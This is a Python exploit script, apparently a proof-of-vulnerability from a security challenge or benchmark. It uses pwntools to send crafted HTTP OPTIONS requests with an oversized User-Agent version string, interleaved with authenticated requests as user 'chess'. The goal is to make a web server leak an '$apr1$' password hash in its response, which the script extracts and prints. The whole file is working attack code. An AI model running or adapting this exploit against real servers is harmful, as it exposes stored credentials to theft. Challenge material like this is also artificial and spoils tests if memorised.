import sys
import requests as req
from requests.auth import HTTPBasicAuth, HTTPDigestAuth
import base64
from pwn import *

NUM_OF_PROCESSES = 3

def handler(signum, frame):
    print('sigalrm fired - time ran out')
    print('[ERROR] POV Failed')
    exit(0)

def find_hash(haystack):
    start = haystack.find(b'$apr1$')
    if (start > 0):
        end = haystack.find(b',',start)
        privdata = haystack[start:end].decode()
        print("PRIVDATA_HERE=" + privdata)
        print('[SUCCESS] POV Succeeded')
        return
    print('[FAILED] POV Failed')

def options_request(checkOn, iterVal):
    value = 256 * iterVal 
    p = remote(HOST, PORT)
    data = 'OPTIONS http://' + HOST + ':' + str(PORT) + '/bravo/index.html HTTP/1.1\r\n' 
    data += 'Host: ' + HOST + '\r\n'
    data += 'User-Agent: User-Agent: curl/' + str(value)  + '.256.256.256\r\n'
    data += 'Accept: */*\r\n\r\n'
    p.send(data)
    d = p.recv()
    if checkOn:
        #print(d)
        find_hash(d)
    p.close()

def access_authed_index(user, passwd):
    auth_str = user + ':' + passwd
    auth_bytes = auth_str.encode('ascii')
    auth_bytes_b64 = base64.b64encode(auth_bytes)
    auth_str_b64 = auth_bytes_b64.decode('ascii')
    p = remote(HOST, PORT)
    data = 'GET /~' + user + '/ HTTP/1.1\r\n'
    data += 'Host: ' + HOST + ':' + str(PORT) + '\r\n'
    data += 'Connection: keep-alive\r\n'
    data += 'Cache-Control: max-age=0\r\n'
    data += 'Authorization: Basic ' + auth_str_b64 + '\r\n'
    data += 'Upgrade-Insecure-Requests: 1\r\n'
    data += 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36\r\n'
    data += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    data += 'Sec-GPC: 1\r\n'
    data += 'Accept-Encoding: gzip, deflate\r\n'
    data += 'Accept-Language: en-US,en;q=0.9\r\n\r\n'
    p.send(data)

    d = p.recv().decode('utf-8')
    #print(d)
    p.close()

def main():
    global HOST
    global PORT 
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)
    print('Host ' + os.environ['HOST'] + ' and PORT: ' + os.environ['PORT'])

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)

    print('Starting ' + str(NUM_OF_PROCESSES) + ' processes')
    for x in range(NUM_OF_PROCESSES):
        options_request(0,1979) # value determined through testing against debugged version of challenge
    for x in range(NUM_OF_PROCESSES):
        access_authed_index('chess', 'chess')
    options_request(1, 0)

 
if __name__ == '__main__':
    main()